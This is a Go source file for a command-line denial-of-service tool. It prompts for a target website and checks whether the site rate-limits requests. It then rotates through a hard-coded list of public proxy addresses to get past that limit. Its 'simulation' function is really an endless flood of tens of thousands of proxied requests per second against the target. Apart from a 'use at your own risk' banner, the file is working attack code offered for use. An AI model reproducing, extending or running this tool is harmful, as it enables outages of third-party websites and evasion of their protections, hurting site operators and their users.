package main

import (
	"fmt"
	"net/http"
	"net/url"
	"time"
)

var proxyServers = []string{
	"183.88.212.184:8080", "160.19.155.51:8080", "144.76.42.215:8118", "165.16.46.193:8080",
	"202.62.67.209:53281", "103.70.79.3:8080", "62.33.207.202:3128", "181.209.82.154:23500",
	"24.172.82.94:53281", "91.214.31.234:8080", "37.120.192.154:8080", "82.64.77.30:80",
	"51.15.242.202:8888", "120.29.124.131:8080", "103.165.218.234:8085", "202.5.36.152:5020",
	"200.7.118.62:666", "41.57.25.129:6060", "103.26.108.254:84", "202.154.18.133:8080",
	"103.91.82.177:8080", "66.27.58.70:8080", "103.26.110.134:84", "185.82.98.42:9092",
	"175.106.10.227:7878", "177.87.250.66:999", "103.255.147.102:82", "91.204.239.189:8080",
	"154.236.177.123:1976", "188.132.222.166:8080", "103.164.221.34:8080", "121.101.131.67:1111",
	"61.254.81.88:9000", "64.157.16.43:8080", "83.171.90.83:8080",
}

func checkDDoSProtection(targetURL string) bool {
	fmt.Printf("Checking for DDoS protection on target website: %s...\n", targetURL)
	response, err := http.Get(targetURL)
	if err != nil {
		fmt.Println("Error:", err)
		return false
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusTooManyRequests {
		fmt.Println("DDoS protection detected: Rate limiting in place.")
		return true
	}
	fmt.Println("No DDoS protection detected.")
	return false
}

func bypassDDoSProtection(targetURL string) {
	fmt.Println("Attempting to bypass DDoS protection...")
	for _, proxy := range proxyServers {
		proxyURL, err := url.Parse("http://" + proxy)
		if err != nil {
			fmt.Println("Error parsing proxy URL:", err)
			continue
		}
		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			},
		}
		response, err := client.Get(targetURL)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}
		defer response.Body.Close()
		if response.StatusCode != http.StatusTooManyRequests {
			fmt.Printf("Bypass successful. Proxy server %s used.\n", proxy)
			return
		}
	}
	fmt.Println("Bypass unsuccessful. DDoS protection may still be in place.")
}

func simulateDDoSAttack(targetURL string) {
	fmt.Printf("Simulating DDoS Attack on target website: %s...\n", targetURL)
	for {
		startTime := time.Now()
		for i := 0; i < 1000; i++ {
			for _, proxy := range proxyServers {
				go func(p string) {
					proxyURL, err := url.Parse("http://" + p)
					if err != nil {
						fmt.Println("Error parsing proxy URL:", err)
						return
					}
					client := &http.Client{
						Transport: &http.Transport{
							Proxy: http.ProxyURL(proxyURL),
						},
					}
					_, err = client.Get(targetURL)
					if err != nil {
						fmt.Println("Error:", err)
					}
				}(proxy)
			}
		}
		elapsed := time.Since(startTime)
		sleepTime := time.Second - elapsed
		time.Sleep(sleepTime)
	}
}

func main() {
	fmt.Println("========================")
	fmt.Println("Use it at your own Risk")
	fmt.Println("Use it at your own Risk")
	fmt.Println("Use it at your own Risk")
	fmt.Println("========================")

	var targetURL string
	fmt.Print("Enter your target website link: ")
	fmt.Scanln(&targetURL)

	if checkDDoSProtection(targetURL) {
		var bypassChoice string
		fmt.Print("Do you want to attempt to bypass DDoS protection? (yes/no): ")
		fmt.Scanln(&bypassChoice)
		if bypassChoice == "yes" {
			bypassDDoSProtection(targetURL)
		}
	}

	var attackChoice string
	fmt.Print("Do you want to run the DDoS attack simulation? (yes/no): ")
	fmt.Scanln(&attackChoice)
	if attackChoice == "yes" {
		simulateDDoSAttack(targetURL)
	} else {
		fmt.Println("DDoS attack simulation canceled.")
	}
}
